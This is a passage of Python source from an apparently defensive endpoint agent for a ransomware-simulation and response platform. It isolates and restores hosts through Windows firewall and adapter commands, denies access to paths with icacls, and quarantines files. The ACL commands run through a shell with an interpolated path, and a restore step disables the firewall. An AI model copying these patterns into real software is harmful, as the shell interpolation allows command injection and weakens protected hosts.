        verification = self._verify_isolation(backend_ip, backend_port)
        result_data["verification"] = verification
        
        internet_blocked = verification.get("internet_blocked", False)
        backend_reachable = verification.get("backend_reachable", False)
        
        # =====================================================================
        # STEP 7: Save state for restore
        # =====================================================================
        elapsed = time.time() - start_time
        
        state_to_save = {
            "isolated": internet_blocked,
            "method": method,
            "timestamp": datetime.utcnow().isoformat(),
            "backend_ip": backend_ip,
            "backend_port": backend_port,
            "execution_time_seconds": round(elapsed, 2),
            "original_firewall_state": fw_state,  # CRITICAL: Save original state for restore
            "rules_created": [r["name"] for r in rules_to_create]
        }
        
        save_ok = self._save_containment_state(state_to_save)
        result_data["commands_executed"].append({"step": "save_state", "ok": save_ok})
        
        # =====================================================================
        # RESULT
        # =====================================================================
        if internet_blocked:
            result_data["status"] = "success"
            result_data["is_isolated"] = True
            self.logger.info(f"[CONTAINMENT] ===== ISOLATED SUCCESSFULLY in {elapsed:.1f}s =====")
        else:
            result_data["status"] = "partial"
            result_data["is_isolated"] = False
            result_data["warning"] = "Internet may not be fully blocked"
            self.logger.warning(f"[CONTAINMENT] Isolation may be incomplete - internet still reachable")
        
        result_data["execution_time_seconds"] = round(elapsed, 2)
        
        # Report to backend
        self._report_containment_result(run_id, "isolate_host", False, result_data["commands_executed"], {
            "isolated": internet_blocked,
            "backend_reachable": backend_reachable
        })
        
        return (internet_blocked, json.dumps(result_data))
    
    def containment_restore_network(self, parameters: dict) -> tuple:
        """
        STATEFUL network restore - reverts firewall to EXACT pre-isolation state.
        
        This implementation:
        1. Loads saved state from containment_state.json
        2. Removes ALL RANSOMRUN_ firewall rules
        3. Restores EXACT original firewall profile settings (Enabled, DefaultInbound, DefaultOutbound)
        4. Verifies internet connectivity is restored
        5. Deletes state file after successful restore
        
        Is IDEMPOTENT - safe to call multiple times, returns success if not isolated.
        """
        import time
        start_time = time.time()
        
        run_id = parameters.get("run_id")
        dry_run = parameters.get("dry_run", True)
        force = parameters.get("force", False)
        
        self.logger.info(f"[CONTAINMENT] ===== RESTORE NETWORK (STATEFUL) =====")
        self.logger.info(f"[CONTAINMENT] DryRun: {dry_run}, Force: {force}")
        
        result_data = {
            "action": "restore_network",
            "dry_run": dry_run,
            "commands_executed": [],
            "verification": None,
            "error": None,
            "is_isolated": True  # Assume still isolated until proven otherwise
        }
        
        # =====================================================================
        # LOAD SAVED STATE
        # =====================================================================
        saved_state = self._load_containment_state()
        
        # =====================================================================
        # DRY RUN - Show what would happen
        # =====================================================================
        if dry_run:
            self.logger.info("[CONTAINMENT] DRY RUN - No changes will be made")
            result_data["status"] = "dry_run"
            
            if saved_state:
                original_profiles = saved_state.get("original_firewall_state", {}).get("profiles", {})
                result_data["commands_planned"] = [
                    "Remove all RANSOMRUN_* firewall rules",
                    f"Restore firewall profiles: {list(original_profiles.keys())}",
                    "For each profile: restore Enabled, DefaultInboundAction, DefaultOutboundAction",
                    "Verify: ping 8.8.8.8 should succeed",
                    "Delete containment_state.json"
                ]
                result_data["original_state_found"] = True
            else:
                result_data["commands_planned"] = [
                    "No saved state found - will use safe defaults",
                    "Remove all RANSOMRUN_* firewall rules",
                    "Set default outbound policy to Allow",
                    "Verify connectivity"
                ]
                result_data["original_state_found"] = False
            
            return (True, json.dumps(result_data))
        
        # =====================================================================
        # ADMIN CHECK - Required for firewall changes
        # =====================================================================
        if not self._is_admin():
            self.logger.error("[CONTAINMENT] Administrator privileges required for restore")
            result_data["status"] = "failed"
            result_data["error"] = "Restore requires Administrator privileges. Run agent as Administrator."
            return (False, json.dumps(result_data))
        
        self.logger.info("[CONTAINMENT] Admin check: PASSED")
        result_data["commands_executed"].append({"step": "admin_check", "ok": True})
        
        # =====================================================================
        # IDEMPOTENCY CHECK - If not isolated, nothing to do
        # =====================================================================
        if not saved_state and not force:
            self.logger.info("[CONTAINMENT] No saved state found - host may not be isolated")
            result_data["status"] = "not_isolated"
            result_data["is_isolated"] = False
            result_data["message"] = "No isolation state found. Host appears to not be isolated."
            return (True, json.dumps(result_data))
        
        if saved_state and not saved_state.get("isolated", False) and not force:
            self.logger.info("[CONTAINMENT] State shows host is not isolated")
            result_data["status"] = "not_isolated"
            result_data["is_isolated"] = False
            return (True, json.dumps(result_data))
        
        # =====================================================================
        # STEP 1: Remove ALL RANSOMRUN firewall rules
        # =====================================================================
        self.logger.info("[CONTAINMENT] STEP 1: Removing all RANSOMRUN_ firewall rules...")
        cleanup_result = self._remove_ransomrun_firewall_rules()
        result_data["commands_executed"].append({
            "step": "remove_ransomrun_rules",
            "ok": True,
            "rules_removed": cleanup_result.get("removed", 0)
        })
        
        # Also clean up any legacy rules that might exist
        legacy_rules = ["RANSOMRUN_OUT", "RANSOMRUN_IN", "RANSOMRUN_LO_OUT", "RANSOMRUN_LO_IN", "ALLOW_ALL_OUT"]
        for rule in legacy_rules:
            subprocess.run(
                ["netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule}"],
                capture_output=True, timeout=5
            )
        
        # =====================================================================
        # STEP 2: Restore original firewall profile states
        # =====================================================================
        self.logger.info("[CONTAINMENT] STEP 2: Restoring original firewall profile states...")
        
        profiles_restored = False
        if saved_state and "original_firewall_state" in saved_state:
            original_fw = saved_state["original_firewall_state"]
            profiles = original_fw.get("profiles", {})
            
            if profiles and not original_fw.get("capture_failed", False):
                self.logger.info(f"[CONTAINMENT] Restoring profiles: {list(profiles.keys())}")
                profiles_restored = self._apply_firewall_profile_state(profiles)
                result_data["commands_executed"].append({
                    "step": "restore_profiles",
                    "ok": profiles_restored,
                    "profiles": list(profiles.keys())
                })
            else:
                self.logger.warning("[CONTAINMENT] No valid original profiles in saved state, using defaults")
        
        # If no saved state or restore failed, apply safe defaults
        if not profiles_restored:
            self.logger.info("[CONTAINMENT] Applying safe default profile settings...")
            
            # Safe defaults: firewall enabled, block inbound, ALLOW outbound
            default_profiles = {
                "Domain": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"},
                "Private": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"},
                "Public": {"Enabled": "True", "DefaultInboundAction": "Block", "DefaultOutboundAction": "Allow"}
            }
            
            profiles_restored = self._apply_firewall_profile_state(default_profiles)
            result_data["commands_executed"].append({
                "step": "apply_default_profiles",
                "ok": profiles_restored,
                "note": "Applied safe defaults (outbound allowed)"
            })
        
        # =====================================================================
        # STEP 3: Verify internet connectivity is restored
        # =====================================================================
        self.logger.info("[CONTAINMENT] STEP 3: Verifying internet connectivity...")
        internet_restored = False
        
        # Give firewall a moment to apply changes
        time.sleep(1)
        
        try:
            ping = subprocess.run(
                ["ping", "-n", "2", "-w", "2000", "8.8.8.8"],
                capture_output=True, text=True, timeout=10
            )
            internet_restored = ping.returncode == 0
            self.logger.info(f"[CONTAINMENT] Ping test: {'SUCCESS' if internet_restored else 'FAILED'}")
        except Exception as e:
            self.logger.warning(f"[CONTAINMENT] Ping test error: {e}")
        
        result_data["verification"] = {"internet_restored": internet_restored}
        
        # =====================================================================
        # STEP 4: If still blocked, try additional recovery steps
        # =====================================================================
        if not internet_restored:
            self.logger.warning("[CONTAINMENT] Internet still blocked, trying additional recovery...")
            
            # Try setting outbound to allow explicitly via netsh
            subprocess.run(
                ["netsh", "advfirewall", "set", "allprofiles", "firewallpolicy", "blockinbound,allowoutbound"],
                capture_output=True, timeout=10
            )
            result_data["commands_executed"].append({"step": "force_allow_outbound", "ok": True})
            
            # Test again
            time.sleep(1)
            try:
                ping2 = subprocess.run(
                    ["ping", "-n", "2", "-w", "2000", "8.8.8.8"],
                    capture_output=True, timeout=10
                )
                internet_restored = ping2.returncode == 0
            except:
                pass
            
            result_data["verification"]["internet_restored_after_recovery"] = internet_restored
        
        # =====================================================================
        # STEP 5: Delete state file (mark as restored)
        # =====================================================================
        if internet_restored:
            self.logger.info("[CONTAINMENT] STEP 5: Cleaning up state file...")
            self._delete_containment_state()
            result_data["commands_executed"].append({"step": "delete_state_file", "ok": True})
        
        # =====================================================================
        # RESULT
        # =====================================================================
        elapsed = time.time() - start_time
        
        if internet_restored:
            result_data["status"] = "success"
            result_data["is_isolated"] = False
            self.logger.info(f"[CONTAINMENT] ===== RESTORED SUCCESSFULLY in {elapsed:.1f}s =====")
        else:
            result_data["status"] = "partial"
            result_data["is_isolated"] = True  # May still be partially isolated
            result_data["warning"] = "Internet connectivity may not be fully restored"
            self.logger.warning(f"[CONTAINMENT] Restore incomplete - internet may still be blocked")
        
        result_data["execution_time_seconds"] = round(elapsed, 2)
        
        # Report to backend
        self._report_containment_result(run_id, "restore_network", False, result_data["commands_executed"], {
            "restored": internet_restored,
            "is_isolated": not internet_restored
        })
        
        return (True, json.dumps(result_data))
    
    def containment_block_path(self, parameters: dict) -> tuple:
        """Block a file/directory path using ACLs."""
        run_id = parameters.get("run_id")
        path = parameters.get("path")
        mode = parameters.get("mode", "acl_deny")
        dry_run = parameters.get("dry_run", True)
        
        if not path:
            return (False, "Path is required")
        
        self.logger.info(f"[CONTAINMENT] Blocking path: {path} (mode={mode}, dry_run={dry_run})")
        
        commands = []
        target_path = Path(path)
        
        if mode == "quarantine_and_deny":
            # Move to quarantine first
            quarantine_dir = Path(r"C:\ProgramData\RansomRun\Quarantine")
            quarantine_dir.mkdir(parents=True, exist_ok=True)
            
            timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
            quarantine_path = quarantine_dir / f"{timestamp}_{target_path.name}"
            
            commands.append({
                "type": "move",
                "source": str(target_path),
                "dest": str(quarantine_path)
            })
            
            if not dry_run and target_path.exists():
                try:
                    shutil.move(str(target_path), str(quarantine_path))
                    target_path = quarantine_path
                except Exception as e:
                    return (False, f"Failed to move to quarantine: {e}")
        
        # Apply ACL deny
        acl_commands = [
            f'icacls "{target_path}" /inheritance:r',
            f'icacls "{target_path}" /deny Everyone:(RX)'
        ]
        
        for cmd in acl_commands:
            commands.append({"type": "cmd", "command": cmd})
        
        if not dry_run:
            try:
                for cmd in acl_commands:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    if result.returncode != 0:
                        self.logger.warning(f"ACL command warning: {result.stderr}")
            except Exception as e:
                return (False, f"ACL block error: {e}")
        
        self._report_containment_result(run_id, "block_path", dry_run, commands, {"path": path, "mode": mode})
        
        status = "dry_run" if dry_run else "success"
        return (True, json.dumps({
            "action": "block_path",
            "path": path,
            "mode": mode,
            "status": status,
            "commands": commands
        }))
    
    def containment_quarantine_file(self, parameters: dict) -> tuple:
        """Move a file to quarantine location."""
        run_id = parameters.get("run_id")
        path = parameters.get("path")
        dry_run = parameters.get("dry_run", True)
        
        if not path:
            return (False, "Path is required")
        
        self.logger.info(f"[CONTAINMENT] Quarantining file: {path} (dry_run={dry_run})")
        
        source_path = Path(path)
        quarantine_dir = Path(r"C:\ProgramData\RansomRun\Quarantine")
        quarantine_dir.mkdir(parents=True, exist_ok=True)
        
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        quarantine_path = quarantine_dir / f"{timestamp}_{source_path.name}"
        
        commands = [{
            "type": "move",
            "source": str(source_path),
            "dest": str(quarantine_path)
        }]
        
        if not dry_run:
            if not source_path.exists():
                return (False, f"File not found: {path}")
            
            try:
                shutil.move(str(source_path), str(quarantine_path))
            except Exception as e:
                return (False, f"Quarantine error: {e}")
        
        self._report_containment_result(run_id, "quarantine_file", dry_run, commands, {"path": path})
        
        status = "dry_run" if dry_run else "success"
        return (True, json.dumps({
            "action": "quarantine_file",
            "source": str(source_path),
            "destination": str(quarantine_path),
            "status": status,
            "commands": commands
        }))
    
    def _report_containment_result(self, run_id: Optional[int], action: str, dry_run: bool, commands: list, extra: dict = None):
        """Report containment action result to backend."""
        if not run_id:
            return
        
        try:
            payload = {
                "run_id": run_id,
                "action": action,
                "status": "dry_run" if dry_run else "success",
                "commands": commands,
                "details": extra or {}
            }
            
            # This would trigger the appropriate event on the backend
            # For now, the task result handles this
            self.logger.info(f"Containment action {action} completed: {payload}")
            
        except Exception as e:
            self.logger.warning(f"Failed to report containment result: {e}")
    
    # =========================================================================
    # SOAR NETWORK ISOLATION/RESTORE (Robust Implementation)
    # =========================================================================
    
    def soar_isolate_host(self, parameters: dict) -> tuple:
        """
        Robust host isolation with comprehensive state capture.
        
        This implementation:
        1. Checks admin privileges
        2. Captures complete network state (adapters, IPs, DNS, gateway)
        3. Stores state locally for recovery after reboot
        4. Applies isolation based on mode (firewall or adapter)
        5. Verifies isolation succeeded
        6. Reports results back to backend
        """
        import time
        import hashlib
        start_time = time.time()
        
        mode = parameters.get("mode", "firewall")
        dry_run = parameters.get("dry_run", False)
        allow_backend = parameters.get("allow_backend", True)
        backend_config = parameters.get("backend_allow", {})
        backend_ip = backend_config.get("ip", "127.0.0.1")
        backend_ports = backend_config.get("ports", [8000])
        isolation_state_id = parameters.get("isolation_state_id")
        
        self.logger.info(f"[SOAR] ===== ISOLATE HOST =====")
        self.logger.info(f"[SOAR] Mode: {mode}, Backend: {backend_ip}:{backend_ports}, DryRun: {dry_run}")
        
        # Result structure
        result = {
            "success": False,
            "message": "",
            "mode": mode,
            "pre_state": None,
            "post_state": None,
            "commands": [],
            "stdout": "",
            "stderr": "",
            "errors": [],
            "verification_passed": False,
            "verification_details": {},
            "duration_seconds": 0,
            "isolation_state_id": isolation_state_id
        }
        
        # Setup data directory
        data_dir = Path(r"C:\ProgramData\RansomRun")
        data_dir.mkdir(parents=True, exist_ok=True)
        state_file = data_dir / "isolation_state.json"
        
        # STEP 1: Check admin privileges
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            is_admin = False
        
        if not is_admin:
            result["errors"].append("Administrator privileges required for network isolation")
            result["message"] = "FAILED: Not running as Administrator"
            return (False, json.dumps(result))
        
        # STEP 2: Capture pre-isolation network state
        self.logger.info("[SOAR] Capturing network state...")
        pre_state = self._soar_capture_network_state()
        result["pre_state"] = pre_state
        
        if dry_run:
            result["success"] = True
            result["message"] = f"[DRY RUN] Would isolate host with mode: {mode}"
            result["duration_seconds"] = round(time.time() - start_time, 2)
            return (True, json.dumps(result))
        
        # STEP 3: Apply isolation based on mode
        if mode == "firewall":
            isolation_result = self._soar_apply_firewall_isolation(backend_ip, backend_ports, allow_backend)
        elif mode == "adapter":
            isolation_result = self._soar_apply_adapter_isolation(pre_state, backend_ip)
        elif mode == "hybrid":
            # Apply both firewall and adapter isolation
            fw_result = self._soar_apply_firewall_isolation(backend_ip, backend_ports, allow_backend)
            adapter_result = self._soar_apply_adapter_isolation(pre_state, backend_ip)
            isolation_result = {
                "success": fw_result["success"] and adapter_result["success"],
                "commands": fw_result["commands"] + adapter_result["commands"],
                "stdout": fw_result["stdout"] + adapter_result["stdout"],
                "stderr": fw_result["stderr"] + adapter_result["stderr"],
                "errors": fw_result["errors"] + adapter_result["errors"],
                "firewall_rules": fw_result.get("firewall_rules", [])
            }
        else:
            result["errors"].append(f"Unknown isolation mode: {mode}")
            result["message"] = f"FAILED: Unknown mode {mode}"
            return (False, json.dumps(result))
        
        result["commands"] = isolation_result["commands"]
        result["stdout"] = isolation_result["stdout"]
        result["stderr"] = isolation_result["stderr"]
        result["errors"].extend(isolation_result["errors"])
        result["firewall_rules"] = isolation_result.get("firewall_rules", [])
        
        # STEP 4: Verify isolation
        self.logger.info("[SOAR] Verifying isolation...")
        verification = self._soar_verify_isolation(backend_ip, backend_ports[0] if backend_ports else 8000)
        result["verification_passed"] = verification["isolated"]
        result["verification_details"] = verification
        
        # STEP 5: Capture post-isolation state
        post_state = self._soar_capture_network_state()
        result["post_state"] = post_state
        
        # STEP 6: Save state locally for recovery after reboot
        state_data = {
            "isolated": True,
            "mode": mode,
            "timestamp": datetime.utcnow().isoformat(),
            "pre_state": pre_state,
            "backend_ip": backend_ip,
            "backend_ports": backend_ports,
            "firewall_rules": isolation_result.get("firewall_rules", []),
            "isolation_state_id": isolation_state_id
        }
        
        try:
            state_file.write_text(json.dumps(state_data, indent=2))
            self.logger.info(f"[SOAR] State saved to {state_file}")
        except Exception as e:
            result["errors"].append(f"Failed to save state file: {e}")
        
        # STEP 7: Report results
        elapsed = time.time() - start_time
        result["duration_seconds"] = round(elapsed, 2)
        result["success"] = isolation_result["success"] and verification["isolated"]
        
        if result["success"]:
            result["message"] = f"Host isolated successfully in {elapsed:.1f}s (mode: {mode})"
            result["status"] = "success"
        else:
            result["message"] = f"Isolation partially succeeded - verification: {verification}"
            result["status"] = "partial"
        
        self.logger.info(f"[SOAR] ===== {'ISOLATED' if result['success'] else 'PARTIAL'} in {elapsed:.1f}s =====")
        
        # Report to backend action log endpoint
        self._soar_report_result(isolation_state_id, result)
        
        return (result["success"], json.dumps(result))
    
    def soar_restore_network(self, parameters: dict) -> tuple:
        """
        Robust network restoration from isolation.
        
        This implementation:
        1. Loads pre-isolation state from backend payload or local file
        2. Removes firewall rules
        3. Re-enables network adapters
        4. Restores DNS/gateway if needed
        5. Verifies restoration succeeded
        """
        import time
        start_time = time.time()
        
        dry_run = parameters.get("dry_run", False)
        force = parameters.get("force", False)
        isolation_state_id = parameters.get("isolation_state_id")
        pre_state = parameters.get("pre_state")
        mode = parameters.get("mode", "firewall")
        
        self.logger.info(f"[SOAR] ===== RESTORE NETWORK =====")
        self.logger.info(f"[SOAR] Mode: {mode}, Force: {force}, DryRun: {dry_run}")
        
        result = {
            "success": False,
            "message": "",
            "mode": mode,
            "pre_state": None,
            "post_state": None,
            "commands": [],
            "stdout": "",
            "stderr": "",
            "errors": [],
            "verification_passed": False,
            "verification_details": {},
            "duration_seconds": 0,
            "isolation_state_id": isolation_state_id
        }
        
        # Setup paths
        data_dir = Path(r"C:\ProgramData\RansomRun")
        state_file = data_dir / "isolation_state.json"
        
        # Check admin
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            is_admin = False
        
        if not is_admin:
            result["errors"].append("Administrator privileges required")
            result["message"] = "FAILED: Not running as Administrator"
            return (False, json.dumps(result))
        
        # Load state from local file if not provided
        if not pre_state and state_file.exists():
            try:
                local_state = json.loads(state_file.read_text())
                pre_state = local_state.get("pre_state")
                mode = local_state.get("mode", mode)
                self.logger.info("[SOAR] Loaded state from local file")
            except Exception as e:
                self.logger.warning(f"[SOAR] Failed to load local state: {e}")
        
        result["pre_state"] = pre_state
        
        if dry_run:
            result["success"] = True
            result["message"] = "[DRY RUN] Would restore network connectivity"
            result["duration_seconds"] = round(time.time() - start_time, 2)
            return (True, json.dumps(result))
        
        # STEP 1: Remove firewall isolation rules
        self.logger.info("[SOAR] Removing firewall isolation...")
        fw_result = self._soar_remove_firewall_isolation()
        result["commands"].extend(fw_result["commands"])
        result["stdout"] += fw_result["stdout"]
        result["stderr"] += fw_result["stderr"]
        result["errors"].extend(fw_result["errors"])
        
        # STEP 2: Re-enable adapters if adapter mode was used
        if mode in ["adapter", "hybrid"] and pre_state:
            self.logger.info("[SOAR] Re-enabling network adapters...")
            adapter_result = self._soar_restore_adapters(pre_state)
            result["commands"].extend(adapter_result["commands"])
            result["stdout"] += adapter_result["stdout"]
            result["stderr"] += adapter_result["stderr"]
            result["errors"].extend(adapter_result["errors"])
        
        # STEP 3: Reset firewall to defaults and allow outbound
        self.logger.info("[SOAR] Setting permissive firewall policy...")
        reset_result = self._soar_reset_firewall_permissive()
        result["commands"].extend(reset_result["commands"])
        result["stdout"] += reset_result["stdout"]
        result["stderr"] += reset_result["stderr"]
        
        # STEP 4: Verify restoration
        self.logger.info("[SOAR] Verifying network restoration...")
        verification = self._soar_verify_restoration()
        result["verification_passed"] = verification["restored"]
        result["verification_details"] = verification
        
        # STEP 5: If still not restored, take aggressive measures
        if not verification["restored"]:
            self.logger.warning("[SOAR] Aggressive restore - disabling firewall...")
            aggressive_result = self._soar_aggressive_restore()
            result["commands"].extend(aggressive_result["commands"])
            result["stdout"] += aggressive_result["stdout"]
            
            # Re-verify
            verification = self._soar_verify_restoration()
            result["verification_passed"] = verification["restored"]
            result["verification_details"] = verification
        
        # STEP 6: Capture post-restore state
        post_state = self._soar_capture_network_state()
        result["post_state"] = post_state
        
        # STEP 7: Clean up local state file
        if state_file.exists():
            try:
                state_file.unlink()
                self.logger.info("[SOAR] Removed local state file")
            except:
                pass
        
        elapsed = time.time() - start_time
        result["duration_seconds"] = round(elapsed, 2)
        result["success"] = verification["restored"]
        
        if result["success"]:
            result["message"] = f"Network restored successfully in {elapsed:.1f}s"
            result["status"] = "success"
        else:
            result["message"] = f"Restoration partially succeeded - check manually"
            result["status"] = "partial"
        
        self.logger.info(f"[SOAR] ===== {'RESTORED' if result['success'] else 'PARTIAL'} in {elapsed:.1f}s =====")
        
        # Report to backend
        self._soar_report_result(isolation_state_id, result)
        
        return (result["success"], json.dumps(result))
    
    def _soar_capture_network_state(self) -> dict:
        """Capture comprehensive network state using PowerShell."""
        state = {
            "adapters": [],
            "routes": [],
            "firewall_profiles": {},
            "dns_servers": [],
            "captured_at": datetime.utcnow().isoformat()
        }
        
        try:
            # Get adapter information
            ps_adapters = '''
            Get-NetAdapter | Select-Object Name, InterfaceIndex, InterfaceDescription, 
                MacAddress, Status, LinkSpeed, MediaType, Virtual | ConvertTo-Json -Depth 3
            '''
            adapter_result = subprocess.run(
                ["powershell", "-Command", ps_adapters],
                capture_output=True, text=True, timeout=30
            )
            if adapter_result.returncode == 0 and adapter_result.stdout.strip():
                adapters_raw = json.loads(adapter_result.stdout)
                if not isinstance(adapters_raw, list):
                    adapters_raw = [adapters_raw]
                
                # Get IP configuration for each adapter
                for adapter in adapters_raw:
                    adapter_info = {
                        "name": adapter.get("Name"),
                        "interface_index": adapter.get("InterfaceIndex"),
                        "interface_description": adapter.get("InterfaceDescription"),
                        "mac_address": adapter.get("MacAddress"),
                        "status": adapter.get("Status"),
                        "is_virtual": adapter.get("Virtual", False),
                        "was_enabled": adapter.get("Status") == "Up",
                        "ip_addresses": [],
                        "subnet_masks": [],
                        "default_gateway": None,
                        "dns_servers": []
                    }
                    
                    # Get IP config
                    try:
                        ps_ip = f'''
                        Get-NetIPConfiguration -InterfaceIndex {adapter.get("InterfaceIndex")} -ErrorAction SilentlyContinue | 
                        Select-Object IPv4Address, IPv4DefaultGateway, DNSServer | ConvertTo-Json -Depth 3
                        '''
                        ip_result = subprocess.run(
                            ["powershell", "-Command", ps_ip],
                            capture_output=True, text=True, timeout=15
                        )
                        if ip_result.returncode == 0 and ip_result.stdout.strip():
                            ip_config = json.loads(ip_result.stdout)
                            if ip_config:
                                ipv4 = ip_config.get("IPv4Address")
                                if ipv4:
                                    if isinstance(ipv4, list):
                                        adapter_info["ip_addresses"] = [a.get("IPAddress") for a in ipv4 if a]
                                    elif isinstance(ipv4, dict):
                                        adapter_info["ip_addresses"] = [ipv4.get("IPAddress")]
                                
                                gw = ip_config.get("IPv4DefaultGateway")
                                if gw:
                                    if isinstance(gw, list) and gw:
                                        adapter_info["default_gateway"] = gw[0].get("NextHop")
                                    elif isinstance(gw, dict):
                                        adapter_info["default_gateway"] = gw.get("NextHop")
                                
                                dns = ip_config.get("DNSServer")
                                if dns:
                                    if isinstance(dns, list):
                                        adapter_info["dns_servers"] = [d.get("ServerAddresses", []) for d in dns if d]
                                        adapter_info["dns_servers"] = [ip for sublist in adapter_info["dns_servers"] for ip in (sublist if isinstance(sublist, list) else [sublist])]
                    except:
                        pass
                    
                    state["adapters"].append(adapter_info)
            
            # Get firewall profile states
            ps_fw = '''
            Get-NetFirewallProfile | Select-Object Name, Enabled | ConvertTo-Json
            '''
            fw_result = subprocess.run(
                ["powershell", "-Command", ps_fw],
                capture_output=True, text=True, timeout=15
            )
            if fw_result.returncode == 0 and fw_result.stdout.strip():
                profiles = json.loads(fw_result.stdout)
                if not isinstance(profiles, list):
                    profiles = [profiles]
                for p in profiles:
                    state["firewall_profiles"][p.get("Name", "Unknown")] = p.get("Enabled", True)
            
        except Exception as e:
            self.logger.warning(f"[SOAR] Error capturing network state: {e}")
            state["error"] = str(e)
        
        return state
    
    def _soar_apply_firewall_isolation(self, backend_ip: str, backend_ports: list, allow_backend: bool) -> dict:
        """Apply firewall-based isolation."""
        result = {
            "success": False,
            "commands": [],
            "stdout": "",
            "stderr": "",
            "errors": [],
            "firewall_rules": []
        }
        
        try:
            # Step 1: Enable firewall on all profiles
            self.logger.info("[SOAR] Enabling firewall on all profiles...")
            subprocess.run(
                ["netsh", "advfirewall", "set", "allprofiles", "state", "on"],
                capture_output=True, text=True, timeout=10
            )
            result["commands"].append({"cmd": "netsh advfirewall set allprofiles state on", "exit_code": 0})
            
            # Step 2: Set BLOCK policy FIRST
            self.logger.info("[SOAR] Setting block policy...")
            block = subprocess.run(
                ["netsh", "advfirewall", "set", "allprofiles", "firewallpolicy", "blockinbound,blockoutbound"],
                capture_output=True, text=True, timeout=10
            )
            result["commands"].append({"cmd": "netsh advfirewall set policy block", "exit_code": block.returncode})
            result["stdout"] += block.stdout
            result["stderr"] += block.stderr
            
            if block.returncode != 0:
                result["errors"].append("Failed to set block policy")
                return result
            
            # Step 3: Create allow rules (these OVERRIDE the block policy)
            rules_created = []
            if allow_backend:
                self.logger.info(f"[SOAR] Creating allow rules for backend {backend_ip}:{backend_ports}...")
                
                # Delete any existing rules first
                for rule_name in ["RANSOMRUN_BACKEND_OUT", "RANSOMRUN_BACKEND_IN", "RANSOMRUN_ALLOW_IN",
                                  "RANSOMRUN_LOCALHOST_IN", "RANSOMRUN_LOCALHOST_OUT", "RANSOMRUN_DNS_OUT"]:
                    subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule_name}"],
                                  capture_output=True, timeout=3)
                for port in backend_ports:
                    subprocess.run(["netsh", "advfirewall", "firewall", "delete", "rule", f"name=RANSOMRUN_ALLOW_OUT_{port}"],
                                  capture_output=True, timeout=3)
                
                # Allow ALL traffic to/from backend IP (protocol=any for maximum compatibility)
                rule_name = "RANSOMRUN_BACKEND_OUT"
                out_rule = subprocess.run([
                    "netsh", "advfirewall", "firewall", "add", "rule",
                    f"name={rule_name}", "dir=out", "action=allow",
                    f"remoteip={backend_ip}", "protocol=any", "enable=yes"
                ], capture_output=True, text=True, timeout=10)
                result["commands"].append({"cmd": f"Allow outbound to {backend_ip} (any)", "exit_code": out_rule.returncode})
                rules_created.append(rule_name)
                self.logger.info(f"[SOAR] Backend OUT rule (any protocol to {backend_ip}): exit={out_rule.returncode}")
                
                rule_name = "RANSOMRUN_BACKEND_IN"
                in_rule = subprocess.run([
                    "netsh", "advfirewall", "firewall", "add", "rule",
                    f"name={rule_name}", "dir=in", "action=allow",
                    f"remoteip={backend_ip}", "protocol=any", "enable=yes"
                ], capture_output=True, text=True, timeout=10)
                result["commands"].append({"cmd": f"Allow inbound from {backend_ip} (any)", "exit_code": in_rule.returncode})
                rules_created.append(rule_name)
                self.logger.info(f"[SOAR] Backend IN rule (any protocol from {backend_ip}): exit={in_rule.returncode}")
                
                # Allow localhost (both directions)
                for direction in ["in", "out"]:
                    rule_name = f"RANSOMRUN_LOCALHOST_{direction.upper()}"
                    lo_rule = subprocess.run([
                        "netsh", "advfirewall", "firewall", "add", "rule",
                        f"name={rule_name}", f"dir={direction}", "action=allow",
                        "remoteip=127.0.0.1,::1", "protocol=any", "enable=yes"
                    ], capture_output=True, timeout=10)
                    rules_created.append(rule_name)
                
                # Allow DNS (needed for hostname resolution)
                rule_name = "RANSOMRUN_DNS_OUT"
                subprocess.run([
                    "netsh", "advfirewall", "firewall", "add", "rule",
                    f"name={rule_name}", "dir=out", "action=allow",
                    "protocol=udp", "remoteport=53", "enable=yes"
                ], capture_output=True, timeout=10)
                rules_created.append(rule_name)
                
                result["firewall_rules"] = rules_created
            
            # Step 4: Verify rules were created
            self.logger.info("[SOAR] Verifying firewall rules...")
            verify = subprocess.run(
                ["netsh", "advfirewall", "firewall", "show", "rule", "name=RANSOMRUN_BACKEND_OUT"],
                capture_output=True, text=True, timeout=5
            )
            self.logger.info(f"[SOAR] Rule verification: {verify.stdout[:300] if verify.stdout else 'No output'}")
            
            result["success"] = True
            
        except subprocess.TimeoutExpired:
            result["errors"].append("Command timed out")
        except Exception as e:
            result["errors"].append(str(e))
        
        return result
    
    def _soar_apply_adapter_isolation(self, pre_state: dict, backend_ip: str) -> dict:
        """Disable network adapters for isolation."""
        result = {
            "success": False,
            "commands": [],
            "stdout": "",
            "stderr": "",
            "errors": []
        }
        
        try:
            adapters = pre_state.get("adapters", [])
            disabled_count = 0
            
            for adapter in adapters:
                name = adapter.get("name")
                is_virtual = adapter.get("is_virtual", False)
                status = adapter.get("status")
                
                # Skip virtual adapters and loopback
                if is_virtual or "loopback" in name.lower() if name else False:
                    self.logger.info(f"[SOAR] Skipping virtual adapter: {name}")
                    continue
                
                # Skip already disabled adapters
                if status != "Up":
                    continue
                
                # Disable the adapter
                self.logger.info(f"[SOAR] Disabling adapter: {name}")
                disable = subprocess.run(
                    ["powershell", "-Command", f'Disable-NetAdapter -Name "{name}" -Confirm:$false'],
                    capture_output=True, text=True, timeout=30
                )
                result["commands"].append({"cmd": f"Disable-NetAdapter {name}", "exit_code": disable.returncode})
                result["stdout"] += disable.stdout
                result["stderr"] += disable.stderr
                
                if disable.returncode == 0:
                    disabled_count += 1
                else:
                    result["errors"].append(f"Failed to disable {name}: {disable.stderr}")
            
            result["success"] = disabled_count > 0 or len(adapters) == 0
            
        except Exception as e:
            result["errors"].append(str(e))
        
        return result
    
    def _soar_remove_firewall_isolation(self) -> dict:
        """Remove all RANSOMRUN firewall rules."""
        result = {
            "success": True,
            "commands": [],
            "stdout": "",
            "stderr": "",
            "errors": []
        }
        
        rules_to_remove = [
